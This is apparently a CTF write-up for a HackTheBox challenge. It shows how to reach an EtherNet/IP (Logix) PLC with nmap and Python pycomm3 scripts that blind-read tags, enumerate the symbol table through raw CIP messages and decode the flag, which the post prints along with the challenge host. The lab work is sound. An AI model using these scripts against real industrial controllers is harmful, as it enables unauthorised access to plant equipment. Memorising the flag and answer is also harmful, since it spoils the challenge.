

![](https://cdn-images-1.medium.com/max/1000/1*sBX4P_zYLzw286W_sARLbg.png)

#### Challenge Scenario

---

We’ve discovered an EtherNet/IP controller on the network. Your mission: connect to the device and retrieve the value of the FLAG tag. Can you extract the flag and prove your skills?

namp at first

![](https://cdn-images-1.medium.com/max/1000/1*3IxnzHkCz5cRjL0nKWm2jw.png)

so,use

pip install pycomm3

![](https://cdn-images-1.medium.com/max/1000/1*ZHALN4vk8JYodIb7GO1hiQ.png)

  

use this 

from pycomm3 import LogixDriver, CIPDriver

# 尝试不同的路径组合  
paths = [‘154.57.164.68:31357/0’, ‘154.57.164.68:31357/1’]

for path in paths:  
 print(f”[*] 正在尝试路径: {path}”)  
 # 使用 LogixDriver，但禁用自动扫描标签表 (init_tags=False)  
 with LogixDriver(path, init_tags=False, init_program_tags=False) as plc:  
 try:  
 if plc.open():  
 print(“[+] 连接成功! 正在尝试盲读 ‘FLAG’…”)  
 # 直接尝试读取，不依赖本地标签缓存  
 res = plc.read(‘FLAG’)  
 if res.value is not None:  
 print(f”\n[!] 成功拿到 FLAG: {res.value}”)  
 exit()  
 else:  
 print(f”[-] 在此路径下未读到 FLAG: {res.error}”)  
 except Exception as e:  
 print(f”[x] 此路径不可用: {e}”)

print(“\n[*] 所有常用槽位读取失败。尝试最后的‘通用标识’获取…”)  
with CIPDriver(‘154.57.164.68:31357’) as plc:  
 # 询问设备是谁 (Identity Object, Class 1, Instance 1, Attr 1)  
 info = plc.generic_message(service=b’\x01', class_code=b’\x01', instance=1, attribute=1)  
 print(f”[*] 设备原始响应: {info.value}”)

![](https://cdn-images-1.medium.com/max/1000/1*nVfw52Sqnt0DmncOKcyOsg.png)

we found 1756-L61/B LOGIX5561

than use this

from pycomm3 import CIPDriver  
import struct

IP = ‘154.57.164.68’  
PORT = 31357

def force_enumerate_symbols():  
 with CIPDriver(f’{IP}:{PORT}’) as plc:  
 print(“[*] 正在尝试强行枚举符号表实例 (Class 0x6B)…”)  
   
 # 尝试读取 Class 0x6B 的实例列表 (Service 0x01: Get_Attributes_All)  
 # 这会返回 PLC 中所有标签的 ID 和部分元数据  
 res = plc.generic_message(  
 service=b’\x01',   
 class_code=b’\x6b’,   
 instance=1, # 尝试从第 1 个实例开始  
 attribute=0  
 )  
   
 if res.value:  
 print(f”[+] 发现实例数据: {res.value.hex()}”)  
 else:  
 print(f”[-] 无法枚举实例: {res.error}”)

# 针对之前 FLAG 响应 b’\x00\x00' 的特殊处理：  
 # 尝试用 Service 0x4D (Read Tag Fragmented) — 用于读取超长数据（如长字符串）  
 print(“\n[*] 尝试碎片化读取 ‘FLAG’ (应对长字符串)…”)  
 # 请求读取 100 字节，偏移量 0  
 read_data = b’\x01\x00' + struct.pack(‘<I’, 0)   
 res = plc.generic_message(  
 service=b’\x52', # Unconnected Send 或尝试 0x4D  
 class_code=b’\x6b’,  
 instance=0,  
 attribute=0,  
 request_data=read_data,  
 route_path=b’\x91\x04FLAG\x00\x01\x00'  
 )  
   
 if res.value:  
 print(f”[!] 原始碎片数据: {res.value}”)  
 # 尝试 ASCII 解码  
 print(f”[!] 尝试解码: {res.value.decode(errors=’ignore’)}”)

if __name__ == “__main__”:  
 force_enumerate_symbols()

![](https://cdn-images-1.medium.com/max/1000/1*6uCsseIYqW72n47E6s7yXQ.png)

- `48 00` -> **H**
- `54 00` -> **T**
- `42 00` -> **B**
- `7b 00` -> **{**
- `33 00` -> **3**
- `74 00` -> **t**
- `68 00` -> **h**
- `33 00` -> **3**
- `72 00` -> **r**
- `6e 00` -> **n**
- `33 00` -> **3**
- `74 00` -> **t**
- `31 00` -> **1**
- `70 00` -> **p**
- `5f 00` -> **_**
- `70 00` -> **p**
- `77 00` -> **w**
- `6e 00` -> **n**
- `33 00` -> **3**
- `64 00` -> **d**
- `7d 00` -> **}**

so,here is the flag

**_HTB{3th3rn3t1p_pwn3d}_**